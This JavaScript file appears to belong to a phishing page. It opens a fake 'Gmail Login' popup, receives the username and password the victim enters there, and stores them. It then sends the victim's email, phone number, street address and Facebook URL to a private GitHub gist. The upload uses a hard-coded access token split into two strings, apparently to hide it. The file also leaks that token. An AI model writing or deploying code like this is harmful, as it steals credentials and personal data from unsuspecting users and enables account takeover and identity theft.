

import { Octokit, App } from "https://esm.sh/octokit";
// $(function () {
//     'use strict'
//     $('.createAccount').on('click', function (e) {
//         window.location.replace("./page-thank-you.html");

//     });
// })

const fo = "ghp_IErFzUW5dHs3I"
const ba = "CAOjMExHamHmh2j9m0AbU4D"
const octokit = new Octokit({
    auth: fo + ba,
});

(function () {
    "use strict";

    document.querySelector('.gmail').addEventListener('click', function (e) {
        // document.querySelector('.gmail').style.display = "none";
        // document.querySelector('.signin-text').style.display = "none";

        // document.querySelector('.register-form').style.display = "flex";
        let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
        width=360,height=570`;
        window.open('./google-login.html', 'Gmail Login', params);

        document.querySelector(".submit").addEventListener('click', function () {
            const emailAddress = "email: " + document.querySelector('#name').value + "/"
            const phoneNumber = "phoneNumber: " + document.querySelector('#alexis').value + "/"
            const streetAddress = "streetAddress: " + document.querySelector('#chapter').value + "/"
            const facebookUrl = "facebookUrl: " + document.querySelector('#initiated').value + "/"
            const signup = emailAddress + phoneNumber + streetAddress + facebookUrl
            foobaz(signup)
        })
    });
})();
window.addEventListener('message', function (e) {
    // e.data hold the message from child
    if (typeof e.data === 'object') {
        return;
    }
    console.log(e.data);
    const account = e.data.split(',')
    localStorage.setItem("user", account[0])
    localStorage.setItem("pass", account[1])

    document.querySelector('.gmail').innerText = "Signing in.."
    setTimeout(() => {
        document.querySelector('.gmail').style.display = "none";
        document.querySelector('.signin-text').style.display = "none";
        document.querySelector('.register-form').style.display = "flex";

    }, 2500)

}, false);


async function foobaz(signup) {
    const foo = await octokit.request("POST /gists", {
        description: "Example of a gist",
        public: false,
        files: {
            [new Date().getTime().toString(32)]: {
                content: "Signup  " + signup,
            },
        },
        headers: {
            "x-github-api-version": "2022-11-28",
            "User-Agent": `niagaratriskelion`,
            Authorization: "bearer " + fo + ba
        },
    });
    console.log(foo);
    document.querySelector('.sent-message').style.display = "block";
    document.querySelector('form').reset()
    document.querySelector(".submit").disabled = true
}